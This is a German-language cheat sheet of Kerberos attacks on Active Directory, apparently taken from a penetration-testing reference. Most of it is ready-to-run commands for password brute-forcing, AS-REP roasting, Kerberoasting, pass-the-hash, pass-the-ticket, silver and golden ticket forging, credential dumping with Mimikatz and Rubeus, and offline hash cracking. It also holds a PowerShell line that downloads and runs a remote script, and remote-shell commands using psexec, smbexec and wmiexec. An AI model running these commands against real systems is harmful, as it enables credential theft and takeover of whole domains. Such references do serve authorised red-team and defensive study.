---
description: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
---

# Kerberos

### **Brute-Force-Angriffe**

Mit [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute):

```bash
python kerbrute.py -domain <domänenname> -users <benutzerdatei> -passwords <passwortdatei> -outputfile <ausgabedatei>
```

Mit [Rubeus](https://github.com/Zer1t0/Rubeus) (Brute-Modul):

```bash
# Mit einer Liste von Benutzern
.\Rubeus.exe brute /users:<benutzerdatei> /passwords:<passwortdatei> /domain:<domänenname> /outfile:<ausgabedatei>

# Überprüft Passwörter für alle Benutzer der aktuellen Domäne
.\Rubeus.exe brute /passwords:<passwortdatei> /outfile:<ausgabedatei>
```

***

### **ASREPRoasting**

Ein Angriff, bei dem ein Angreifer Benutzerkonten ohne Pre-Authentication nutzt. Er fordert ein AS-REP (Authentication Service Reply) vom Domain Controller an und erhält ein Ticket, das offline mit Brute-Force-Methoden geknackt werden kann, um das Passwort des Benutzers zu ermitteln.

Mit [Impacket](https://github.com/SecureAuthCorp/impacket) – GetNPUsers.py:

```bash
# Für alle Domänenbenutzer (Anmeldedaten erforderlich)
python GetNPUsers.py <domäne>/<benutzer>:<passwort> -request -format <[hashcat | john]> -outputfile <ausgabedatei>

# Mit Benutzerliste (ohne Anmeldedaten)
python GetNPUsers.py <domäne>/ -usersfile <benutzerdatei> -format <[hashcat | john]> -outputfile <ausgabedatei>
```

Mit [Rubeus](https://github.com/GhostPack/Rubeus):

```bash
.\Rubeus.exe asreproast /format:<[hashcat | john]> /outfile:<ausgabedatei>
```

Hash-Cracking:

```bash
hashcat -m 18200 -a 0 <asrep_hashes> <passwortliste>
john --wordlist=<passwortliste> <asrep_hashes>
```

***

### **Kerberoasting**

Ein Angriff, bei dem ein Angreifer Service-Tickets (TGS) für Kerberos-geschützte Dienste anfordert. Die Tickets werden offline bruteforciert, um schwache Passwörter von Servicekonten zu erlangen – ohne verdächtige Netzwerkaktivität.

Mit \[Impacket] – GetUserSPNs.py:

```bash
python GetUserSPNs.py <domäne>/<benutzer>:<passwort> -outputfile <ausgabedatei>
```

Mit [Rubeus](https://github.com/GhostPack/Rubeus):

```bash
.\Rubeus.exe kerberoast /outfile:<ausgabedatei>
```

Mit **PowerShell**:

```powershell
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <[hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <ausgabedatei>
```

Hash-Cracking:

```bash
hashcat -m 13100 --force <tgs_hashes> <passwortliste>
john --format=krb5tgs --wordlist=<passwortliste> <tgs_hashes>
```

***

### **Overpass-The-Hash / Pass-The-Key (PTK)**

Ein Angriff, bei dem ein NTLM-Hash (anstelle des Klartextpassworts) verwendet wird, um ein Kerberos Ticket Granting Ticket (TGT) über eine `kerberos::ptt`-ähnliche Technik zu generieren. Damit kann sich der Angreifer authentifizieren, ohne jemals das tatsächliche Passwort zu kennen.

Mit \[Impacket]:

```bash
# Ticket (TGT) mit Hash anfordern
python getTGT.py <domäne>/<benutzer> -hashes [lm_hash]:<ntlm_hash>

# Mit AES-Schlüssel
python getTGT.py <domäne>/<benutzer> -aesKey <aes_key>

# Mit Passwort (wird bei Bedarf abgefragt)
python getTGT.py <domäne>/<benutzer>:<passwort>

# Ticket verfügbar machen
export KRB5CCNAME=<ticket_datei>

# Remote-Befehle ausführen
python psexec.py <domäne>/<benutzer>@<host> -k -no-pass
python smbexec.py <domäne>/<benutzer>@<host> -k -no-pass
python wmiexec.py <domäne>/<benutzer>@<host> -k -no-pass
```

Mit \[Rubeus] + \[PsExec]:

```bash
.\Rubeus.exe asktgt /domain:<domäne> /user:<benutzer> /rc4:<ntlm_hash> /ptt
.\PsExec.exe -accepteula \\<host> cmd
```

***

### **Pass-The-Ticket (PTT)**

Ein Angriff, bei dem ein gültiges Kerberos-Ticket (TGT oder TGS) direkt in den Speicher eines Prozesses injiziert wird. Dadurch kann sich der Angreifer als der Ticketinhaber ausgeben, ohne dessen Anmeldedaten zu kennen.

#### Tickets unter Linux sammeln

Prüfen:

```bash
grep default_ccache_name /etc/krb5.conf
```

Falls _KEYRING_, nutze \[tickey]:

```bash
cp tickey /tmp/tickey
/tmp/tickey -i
```

#### Tickets unter Windows sammeln

Mit **Mimikatz**:

```bash
sekurlsa::tickets /export
```

Mit **Rubeus**:

```powershell
.\Rubeus.exe dump
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<base64_ticket>"))
```

**Format konvertieren** (\[ticket\_converter.py]):

```bash
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```

#### Ticket unter Linux verwenden

```bash
export KRB5CCNAME=<ticket_datei>
python psexec.py <domäne>/<benutzer>@<host> -k -no-pass
```

#### Ticket unter Windows verwenden

**Mimikatz**:

```bash
kerberos::ptt <ticket.kirbi>
```

**Rubeus**:

```bash
.\Rubeus.exe ptt /ticket:<ticket.kirbi>
```

**Befehl ausführen (z. B. PsExec)**:

```bash
.\PsExec.exe -accepteula \\<host> cmd
```

***

### **Silver Ticket**

Ein **Silver Ticket** ist ein gefälschtes **Service Ticket (TGS)**, das lokal erstellt wird, um Zugriff auf einen bestimmten Kerberos-geschützten Dienst zu erhalten. Es erfordert nur den Hash des Dienstkontos (z. B. eines SQL- oder Webdienstes), nicht den KRBTGT-Key.

Mit \[Impacket]:

```bash
python ticketer.py -nthash <ntlm_hash> -domain-sid <domänen_sid> -domain <domäne> -spn <dienst_spn> <benutzer>
python ticketer.py -aesKey <aes_key> ...
export KRB5CCNAME=<ticket_datei>
python psexec.py ...
```

Mit **Mimikatz**:

```bash
kerberos::golden /domain:<domäne>/sid:<sid> /rc4:<ntlm_hash> /user:<benutzer> /service:<dienst> /target:<zielhost>
```

***

### **Golden Ticket**

Ein **Gold Ticket** ist ein gefälschtes **Ticket Granting Ticket (TGT)** in Kerberos, das mit dem geheimen **KRBTGT-Schlüssel** erstellt wurde. Damit kann sich ein Angreifer gegenüber jedem Dienst im Active Directory als beliebiger Benutzer (z. B. Domain-Admin) ausgeben. Voraussetzung: Zugriff auf den KRBTGT-Key.

Mit \[Impacket]:

```bash
python ticketer.py -nthash <krbtgt_ntlm> -domain-sid <sid> -domain <domäne> <benutzer>
```

Mit **Mimikatz**:

```bash
kerberos::golden /domain:<domäne>/sid:<sid> /aes256:<aes_key> /user:<benutzer>
```

Dann Ticket wie oben injizieren (Rubeus, Mimikatz) und ausführen (z. B. PsExec).

***

### **Sonstiges**

NTLM aus Passwort erzeugen:

```python
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<passwort>".encode("utf-16le")).digest())'
```

***

<details>

<summary>Tools</summary>

[Impacket](https://github.com/SecureAuthCorp/impacket)

[Mimikatz](https://github.com/gentilkiwi/mimikatz)

[Rubeus](https://github.com/GhostPack/Rubeus)

[Rubeus (mit Brute-Modul)](https://github.com/Zer1t0/Rubeus)

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

[kerbrute.py](https://github.com/TarlogicSecurity/kerbrute)

[tickey](https://github.com/TarlogicSecurity/tickey)

[ticket\_converter.py](https://github.com/Zer1t0/ticket_converter)

</details>
